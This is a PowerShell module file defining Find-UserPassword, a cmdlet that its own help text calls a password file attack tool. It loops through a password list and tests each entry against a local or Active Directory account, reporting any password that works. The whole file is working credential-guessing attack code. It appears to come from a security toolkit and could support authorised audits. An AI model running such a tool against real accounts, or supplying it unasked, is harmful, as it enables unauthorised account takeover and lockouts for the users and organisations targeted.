#requires -Version 3 -Modules ActiveDirectory
Set-StrictMode -Version 2

function Find-UserPassword
{
    <#
        .SYNOPSIS
        Test a user account against entries in a specified file. Users could be local or domain user accounts.

        .DESCRIPTION
        This CMDLet is basically a simple password file attack tool, allowing for the testing of a password list 
        against specified Active Directory identities, Active Directory User names (SAM) or local user accounts.

        This CMDLet makes use of the Test-UserCredential CMDLet and specifies its parameters accordingly.

        This CMDLet supports using Kerberos and NTLM,

        .PARAMETER Identity
        Active Directory Identity.
        
        .PARAMETER Username
        Username to try.

        .PARAMETER PasswordFile
        Password list/file.

        .EXAMPLE
        PS C:\> Find-UserPassword -Identify kieran.jacobsen -Password c:\passwordlist.txt

        .INPUTS
        Microsoft.ActiveDirectory.Management.ADUser

        .OUTPUTS
        System.Boolean.

        .LINK
        http://poshsecurity.com
    #>

    [CmdletBinding()]
    [OutputType('ADIdentity', [Microsoft.ActiveDirectory.Management.ADUser])]
    [OutputType('Username', [PSObject])]
    Param
    (
        [Parameter(Mandatory = $True, valuefrompipeline = $True, ParameterSetName = 'ADIdentity')]
        [ValidateNotNullOrEmpty()]
        [Microsoft.ActiveDirectory.Management.ADUser] 
        $Identity,

        [Parameter(Mandatory = $True, valuefrompipeline = $True, ParameterSetName = 'Username')]
        [ValidateNotNullOrEmpty()]
        [String] 
        $Username,

        [Parameter(Mandatory = $True)]
        [ValidateScript({Test-Path $_})]
        [String]
        $PasswordFile,

        [Parameter(Mandatory = $False, ParameterSetName = 'Username')]
        [Switch] $Domain,

        [Parameter(Mandatory = $False)]
        [Switch] $UseKerberos

    )

    Begin
    {
        Write-Verbose -Message "Using Password File $PasswordFile"
        $Passwords = Get-Content -Path $PasswordFile
        $TotalPasswords = ($Passwords | Measure-Object).count
        Write-Verbose -Message "Total Passwords is $TotalPasswords"
        
        # If the password file was blank, throw an error
        if ($TotalPasswords -eq 0)
        { throw 'No Passwords Provided' }
    }

    Process 
    {
        if ($PSCmdlet.ParameterSetName -eq 'ADIdentity')
        {
            # If we are specifying an active directory identity, then we need to resolve that to an ad object.
            # We will also set the username to the SAM Account Name, and enable domain mode
            $ReturnUser = Get-ADUser -Identity $Identity
            $Username = $ReturnUser.SamAccountName
            $Domain = $True
        }
        else
        {
            # Create a custom PS object to return, and add the username
            $ReturnUser = New-Object -TypeName PSObject
            $ReturnUser | Add-Member -NotePropertyName Username -NotePropertyValue $Username
        }

        Write-Verbose -Message "Testing Passwords for user $Username"
        
        $PasswordsProcessed = 0
        $PasswordFound = $False

        While ((-not $PasswordFound) -and ($PasswordsProcessed -le $TotalPasswords))
        {            
            if ($TotalPasswords -ne 1) 
            { 
                $PasswordPercentage = $PasswordsProcessed / $TotalPasswords * 100
                Write-Progress -Activity 'Testing Password' -PercentComplete $PasswordPercentage -Status "$PasswordPercentage % Complete" -ParentId 1 
                
                $PasswordAttempt = $Passwords[($PasswordsProcessed )]
            }
            else
            {
                # So this probably looks quite weird, but there is a reasonable explanation. If the Passowrd list only contains a single entry, 

                $PasswordAttempt = $Passwords
            }
            
            Write-Verbose -Message "Attempting password $PasswordAttempt"

            # Encrypt the password and then send it to test-usercredential with the appropriate parameters
            $SecureStringPassword = ConvertTo-SecureString -String $PasswordAttempt -AsPlainText -Force
            $PasswordFound = Test-UserCredential -Username $Username -Password $SecureStringPassword -Domain:$Domain -UseKerberos:$UseKerberos

            #Increment process count
            $PasswordsProcessed++
        }

        if ($TotalPasswords -ne 1) 
        { Write-Progress -Activity 'Testing Password' -ParentId 1 -Completed }

        # If the password wasn't found, set the password attempt field to an empty string
        if (-not $PasswordFound) 
        { $PasswordAttempt = '' }

        # Update the pipelined object       
        $ReturnUser | Add-Member -NotePropertyName PasswordFound -NotePropertyValue $PasswordFound
        $ReturnUser | Add-Member -NotePropertyName Password -NotePropertyValue $PasswordAttempt

        $ReturnUser
    }
}


